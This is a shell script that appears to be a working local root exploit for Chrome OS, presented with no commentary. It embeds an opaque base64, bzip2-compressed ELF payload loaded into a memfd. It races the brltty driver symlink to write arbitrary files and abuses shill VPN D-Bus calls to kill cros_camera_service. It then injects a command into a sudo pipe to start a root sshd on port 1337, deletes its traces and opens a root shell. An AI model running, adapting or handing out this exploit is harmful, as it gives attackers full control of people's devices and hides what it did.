










stage_sshd() {
        ssh-keygen -f /tmp/ssh_host_rsa_key -N '' -t rsa >/dev/null
        mkdir /tmp/root/
        cp /tmp/ssh_host_rsa_key.pub /tmp/root/k
        cat > /tmp/sshd_config <<-EOF
AuthorizedKeysFile /tmp/%u/k
StrictModes no
HostKey /tmp/ssh_host_rsa_key
Port 1337
EOF
        rm -f /home/chronos/user/.ssh/known_hosts
}

elffd() {
	sleep 1 | foomatic_shell -c '`cat`' 2>/dev/null &
	sleep 0.5
	exec 3>/proc/$!/fd/3
    base64 -d <<-EOF | bunzip2 -dc > /proc/self/fd/3
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
EOF
	exec 4</proc/self/fd/3
	exec 3>&-
}

sevensbrltty(){
	TGT=$1
	/sbin/initctl stop brltty >/dev/null 2>/dev/null
	/sbin/initctl start brltty >/dev/null
	/sbin/initctl stop brltty >/dev/null

	while [ ! -w ${TGT} ]; do
		${ELF} ${TGT} &
		T=$!
		/sbin/initctl start brltty >/dev/null
		timeout 2 sh -c 'while [ ! -e /run/brltty/BrlAPI/1 ]; do :; done'
		/sbin/initctl stop brltty > /dev/null
		rm -f /run/brltty/BrlAPI/?* 2>/dev/null
		kill ${T} 2>/dev/null
	done
}

filewrite() {
	where="$1"
	what="$2"
	sevensbrltty /run/brltty
	rm -f /run/brltty/driver
	ln -s "${where}" /run/brltty/driver
	/sbin/initctl start brltty "BRLTTY_BRAILLE_DRIVER=${what}" >/dev/null
	sleep 0.5
	/sbin/initctl stop brltty >/dev/null
}

runcharon() {
    ret=$(dbus-send --fixed --print-reply --system --dest=org.chromium.flimflam / org.chromium.flimflam.Manager.ConfigureServiceForProfile objpath:/profile/chronos/shill dict:string:variant:AutoConnect,boolean:true,GUID,string:$(uuidgen),L2TPIPsec.ClientCertID,string:,L2TPIPsec.ClientCertSlot,string:,L2TPIPsec.LCPEchoDisabled,string:false,L2TPIPsec.PIN,string:,L2TPIPsec.PSK,string:pskpassword,L2TPIPsec.Password,string:userpassword,L2TPIPsec.User,string:username,Name,string:exploit,ONCSource,string:None,Priority,int32:0,Profile,string:/profile/chronos/shill,Provider.Host,string:127.0.0.1,Provider.Type,string:l2tpipsec,SaveCredentials,boolean:false,Type,string:vpn)

    dbus-send --print-reply --system --dest=org.chromium.flimflam ${ret} org.chromium.flimflam.Service.Connect >/dev/null 2>&1
    echo ${ret}
}

disconnectvpn() {
    path=$1
    dbus-send --print-reply --system --dest=org.chromium.flimflam ${path} org.chromium.flimflam.Service.Disconnect >/dev/null 2>&1
    dbus-send --print-reply --system --dest=org.chromium.flimflam ${path} org.chromium.flimflam.Service.Remove >/dev/null 2>&1
}

killpid() {
    PID=$1
    while [ -d /proc/${PID} ]; do
        path=$(runcharon)
        sleep 1
        filewrite /run/ipsec/charon.pid ${PID}
        disconnectvpn ${path}
        sleep 1
    done
}

echo "Staging sshd..."
stage_sshd

echo "Acquiring elf memfd..."
elffd
ELF=/proc/self/fd/4

echo "Preparing /run/camera_tokens..."
mv /run/camera_tokens/server /run/camera_tokens/server.$$
drivefs=$(mount | grep drivefs | awk '{print $3}')/root/project.$$
mkdir -p ${drivefs}/server
ln -s ${drivefs}/server /run/camera_tokens/server
pkill -STOP drivefs

echo "Killing cros_camera_server..."
killpid $(pidof cros_camera_service)

echo "Waiting for pipe..."
while [ -z "${ppid}" ]; do
    ppid=$(ps ax -o ppid,cmd | grep '[s]udo.*mkdir.*/run/camera_tokens/server' | awk '{print $1}')
    sleep 0.5
done

echo "Appending to pipe..."
TGT=/proc/${ppid}/fd/10
filewrite ${TGT} "/usr/sbin/sshd -f /tmp/sshd_config"
pkill -CONT drivefs

echo "Tidying up..."
rm -rf ${drivefs}
rm /run/camera_tokens/server
sleep 1
ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 rm -rf "${drivefs} /run/camera_tokens/server /run/brltty"

echo "Providing root shell..."
ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1
